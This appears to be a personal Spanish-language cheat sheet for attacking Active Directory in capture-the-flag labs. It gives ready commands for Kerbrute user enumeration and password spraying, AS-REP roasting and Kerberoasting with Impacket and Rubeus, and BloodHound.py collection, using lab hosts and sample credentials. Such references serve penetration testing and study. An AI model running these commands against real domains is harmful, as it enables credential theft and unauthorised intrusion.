# Active Directory CheatSheet

## Kerbrute

### Enumeración de usuarios

```bash
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local users.txt
```

### Password Spraying

```bash
sudo ntpdate 10.10.11.129
./kerbrute passwordspray --dc CONTROLLER.local -d CONTROLLER.local users.txt Password123
```

## AS-REP Roasting

### Impacket

```bash
for user in $(cat users.txt); do impacket-GetNPUsers -dc-ip <ip_de_dominio> <dominio>/${user} -no-pass | grep -v Impacket; done
```

### Rubeus

```powershell
.\Rubeus.exe asreproast # ¿como admin? Ver si se necesitan credenciales
# .\Rubeus.exe asreproast /creduser:htb.local\amanda /credpassword:Password123 # TODO Verificar
```

## Kerberoasting

### Impacket

```bash
impacket-GetUserSPNs {dominio/usuario:contraseña} -dc-ip {ip de dominio} -request
```

### Rubeus

```powershell
.\Rubeus.exe kerberoast # Como Administrator
.\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Password123
```

## BloodHound

### BloodHound.py

**Nota: Al recopilar la info con la última versión es recomendable usar a su vez también la última versión del visualizador.**

#### Setup

[Repositorio Github](https://github.com/fox-it/BloodHound.py)

```bash
pyenv ...
git clone https://github.com/fox-it/BloodHound.py.git
cd BloodHound.py
python setup.py install
```

#### Uso

```bash
python bloodhound.py -u hope.sharp -p 'Password123' -d search.htb -ns 10.10.11.129 -c All
```